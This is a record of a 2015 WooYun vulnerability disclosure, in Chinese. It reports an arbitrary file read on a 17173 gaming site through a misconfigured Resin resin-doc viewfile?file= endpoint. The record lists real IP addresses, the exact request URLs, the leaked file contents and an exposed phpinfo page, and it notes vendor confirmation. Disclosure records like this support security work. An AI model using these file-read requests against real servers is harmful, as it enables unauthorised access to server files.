{"id": 38836, "wybug_id": "wooyun-2015-095355", "wybug_title": "17173某站任意文件读取", "wybug_corp": "17173游戏", "wybug_author": "小土豆", "wybug_date": "2015-02-03 09:23", "wybug_open_date": "2015-03-20 09:24", "wybug_type": "任意文件遍历/下载", "wybug_level": "中", "wybug_rank_0": "8", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["任意文件读取利用", "文件操作参数未加过滤"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2015-02-03：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2015-02-05：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2015-02-15：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2015-02-25：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2015-03-07：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2015-03-20：\t细节向公众公开  简要描述： 某站使用resion，配置不当，导致可以读些文件 详细说明：  http://58.22.102.45/resin-doc/viewfile/?file=/doc/install.xtp\n/doc/install.xtp<document>  <header>    <product>resin</product>    <version>Resin 3.0</version>    <title>Resin Installation</title>  </header>  <body>    <summary/></body></document>\nhttp://58.22.102.45/resin-doc/viewfile/?file=index.jsp\nindex.jsp<%@ page session=\"false\" import=\"com.caucho.vfs.*, com.caucho.server.webapp.*\" %><%--   This is the default start page for the Resin server.  You can replace it as you wish, the documentation will  still be available as /resin-doc if it is installed.  --%><%/** * See if the resin-doc webapp is installed */boolean hasResinDoc = false;boolean hasOrientation = false;ServletContext docApp = application.getContext(\"/resin-doc\");  if (docApp != null) {  String rp = docApp.getRealPath(\"index.xtp\");  if (rp != null && (new java.io.File(rp)).exists())    hasResinDoc = true;  if (hasResinDoc) {    rp = docApp.getRealPath(\"orientation.xtp\");    if (rp != null && (new java.io.File(rp)).exists())      hasOrientation = true;  }}%>……\nhttp://58.22.102.68/test.php再加一个信息泄漏.phpinfo\n\n   漏洞证明：  http://58.22.102.45/resin-doc/viewfile/?file=/doc/install.xtp\n/doc/install.xtp<document>  <header>    <product>resin</product>    <version>Resin 3.0</version>    <title>Resin Installation</title>  </header>  <body>    <summary/></body></document>\nhttp://58.22.102.45/resin-doc/viewfile/?file=index.jsp\nindex.jsp<%@ page session=\"false\" import=\"com.caucho.vfs.*, com.caucho.server.webapp.*\" %><%--   This is the default start page for the Resin server.  You can replace it as you wish, the documentation will  still be available as /resin-doc if it is installed.  --%><%/** * See if the resin-doc webapp is installed */boolean hasResinDoc = false;boolean hasOrientation = false;ServletContext docApp = application.getContext(\"/resin-doc\");  if (docApp != null) {  String rp = docApp.getRealPath(\"index.xtp\");  if (rp != null && (new java.io.File(rp)).exists())    hasResinDoc = true;  if (hasResinDoc) {    rp = docApp.getRealPath(\"orientation.xtp\");    if (rp != null && (new java.io.File(rp)).exists())      hasOrientation = true;  }}%>……\nhttp://58.22.102.68/test.php再加一个信息泄漏.phpinfo\n\n   修复方案：  略   版权声明：转载请注明来源 小土豆@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：中 漏洞Rank：8  确认时间：2015-02-05 14:49 厂商回复： 谢谢关注！ 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n     2015-02-23 01:33 |    \t\tpx1624 \t\t\t( 普通白帽子  |\t\t\t        Rank:1036 漏洞数:175        | px1624)\t\t \n  这么给力，来我们公司吧！    \n  \n\n\n", "wybug_level_fromcorp": "中", "wybug_rank_fromcorp": 8, "Ranks": null}